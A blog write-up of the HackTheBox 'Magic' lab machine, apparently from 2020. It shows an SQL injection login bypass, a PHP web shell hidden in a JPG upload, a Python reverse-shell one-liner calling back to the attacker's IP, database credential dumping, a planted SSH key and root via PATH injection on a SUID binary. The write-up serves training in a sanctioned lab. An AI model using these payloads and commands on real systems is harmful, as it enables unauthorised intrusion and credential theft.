---
title: "HackTheBox: Magic Writeup"
date: 2020-08-22 23:00:00 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---

Todays box is Magic from HackTheBox, it is a linux box with difficulty rating medium. To root this box we will bypass a simple login page with a SQL injection, abuse an image upload function to get a Remote Code Execution, dump MySQL credentials and finally abusing a SUID binary together with a path injection. 

![Magic Infocard](https://jackhack.se/assets/images/magic/magic_info.png)
{: .full}

# Recon

Standard nmap scan reveals only HTTP and SSH ports.

~~~
# Nmap 7.80 scan initiated Sat Aug 22 16:15:09 2020 as: nmap -sC -sV -oA nmap/initial -T5 10.10.10.185
Nmap scan report for magic.htb (10.10.10.185)
Host is up (0.053s latency).
Scanned at 2020-08-22 16:15:09 EDT for 13s
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 22 16:15:22 2020 -- 1 IP address (1 host up) scanned in 13.92 seconds
~~~
{: .language-bash}

The webpage seems to be some kind of image-portfolio. There is also a small login-button at the bottom left.
![Magic webpage](https://jackhack.se/assets/images/magic/magic_webpage.png)
{: .full}

Enumerating the page more shows that it is running PHP, but nothing further intresting, so i would guess that the login page is the path forward. 

# Foothold

Turns out the login is easily bypassed with a simple sql injection, [this page](https://sechow.com/bricks/docs/login-1.html) is great for understanding the basics of SQL injections. 


>SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1'
>The SQL query is crafted in such a way that both username and password verifications are bypassed. The above statement actually queries for all the users in the database and thus bypasses the security.

Something strange was that the webpage did not allow spaces in the username or password, but by writing the injection string in a text editor and pasting it in login forms, i was able to bypass that.

I used the injection string *' or 1=1--* for both user and password and gained access to the upload function.

When trying to upload any standard image, the file would get uploaded to the following url
~~~
http://magic.htb/images/uploads/image.jpg
~~~

Trying to upload a simple php shell gives the following error message

![Shell Error](https://jackhack.se/assets/images/magic/shellupload.png)
{: .full}

Here i decide to try to trick the upload function, by uploading a image containing a php shell. 

~~~
┌──(kali@kali)-[~/boxes/magic]
└─$ cp /usr/share/webshells/php/simple-backdoor.php .

┌──(kali@kali)-[~/boxes/magic]
└─$  mv simple-backdoor.php shell.php

┌──(kali@kali)-[~/boxes/magic]
└─$ cat shell.php >> shell_tmp.jpg

┌──(kali@kali)-[~/boxes/magic]
└─$ mv shell_tmp.jpg shell.php.jpg
~~~
{: .language-bash}

I have an image called shell_tmp.jpg and by appending the contents of shell.php to the end of the JPG file and changing the extension from .jpg to .php.jpg, i might be able to upload my simple backdoor.

The upload now succeeds, and by browsing to the following url
~~~
http://magic.htb/images/uploads/shell.php.jpg?cmd=whoami
~~~

I can tell that i have remote code execution. 
![RCE](https://jackhack.se/assets/images/magic/rce.png)
{: .full}

I proceed by using this web backdoor to spawn a reverse shell by using python

~~~
http://magic.htb/images/uploads/shell.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.124",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

![Shell](https://jackhack.se/assets/images/magic/shell.png)
{: .full}

# User
I am now connected to the box as the user www-data, in the directory */var/www/Magic* there is a file called **db.php5**, by reading the file i am presented with some database credentials. 

~~~
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
~~~
{: .language-php}

The credentials tells me there is a user called **theseus** (this user also has a folder under the /home/ directory), with the password **iamkingtheseus** and the mysql server is hosted at **localhost**. 

Trying to switch user with *su* and the found password just returns an authentication error.

By using mysqldump with these credentials i will be able to see if there is more credentials in the database.

~~~
mysqldump -utheseus -p --all-databases
Pasword: iamkingtheseus
~~~

![Database dump](https://jackhack.se/assets/images/magic/dbdump.png)
{: .full}

The database dump only contains one user, with a similar password as the user **theseus** so im trying to *su* with this password instead and succeed. 

I grabbed the user flag and then quickly generated a ssh key and added it to theseus's authorized_keys so i could get rid of my crappy unstable shell.

~~~
www-data@ubuntu:/var/www/Magic$ su theseus 
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ cd /home/theseus
cd /home/theseus
theseus@ubuntu:~$ cat user.txt
cat user.txt
1261d8caf3a1caed34e7fba22b2f8553
theseus@ubuntu:~$


┌──(kali@kali)-[~/boxes/magic]
└─$ ssh theseus@magic.htb -i theseus_magic
~~~
{: .language-bash}


# Root

Just a quick lookaround as the user doesn't give me anything so on my kali box i set up a python http server and on the compromised box i download the script **linPEAS.sh** using wget.

~~~
┌──(kali@kali)-[~/boxes/magic]
└─$cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .

┌──(kali@kali)-[~/boxes/magic]
└─$ sudo python3 -m http.server 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.185 - - [22/Aug/2020 15:55:21] "GET /linpeas.sh HTTP/1.1" 200 -
~~~
{: .language-bash}

After running linpeas the script discovers a binary with the SUID bit set

![linPEAS SUID Binary](https://jackhack.se/assets/images/magic/linpeas.png)
{: .full}

Running the binary shows a bunch of system information gathered from commands like *fdisk* and *free* and so on. Running **strings** on the binary confirms that those are some of the commands used to get the information.

~~~
theseus@ubuntu:/tmp/yaagn$ strings /bin/sysinfo

--snip--
popen() failed!             
====================Hardware Info====================
lshw -short                
====================Disk Info====================
fdisk -l                                  
====================CPU Info==================== 
cat /proc/cpuinfo                
====================MEM Usage===================== 
free -h
--snip--
~~~
{: .language-bash}

Also the script is not specifying the full path to the binaries *fdisk* and *free* wich means that Ubuntu will use the directories in the $PATH variable to find the binaries and run them. Therefore i should be able to exploit this using path injection.

I will use the same python payload wich gave me the initial shell from the web-part. Add it to a file called *fdisk*, make the file executeable and add my current directory to the $PATH variable.

~~~
theseus@ubuntu:/tmp/yaagn$ nano fdisk
theseus@ubuntu:/tmp/yaagn$ chmod +x fdisk
theseus@ubuntu:/tmp/yaagn$ export PATH=.:$PATH
theseus@ubuntu:/tmp/yaagn$ sysinfo
~~~
{: .language-bash}


Since the SUID bit is set on the *sysinfo* binary, the program is running as root and when it runs my modified *fdisk* program, i will recieve a reverse shell as root. Further reading about exploiting SUID [here](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)


~~~
┌──(kali@kali)-[~/boxes/magic]
└─$ nc -lvnp 9002                                                                                                
listening on [any] 9002 ...
connect to [10.10.14.40] from (UNKNOWN) [10.10.10.185] 56930
# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
# cd /root/
# cat root.txt
09c37b2232af90d7b1608df3dbebf061
~~~
{: .language-bash}
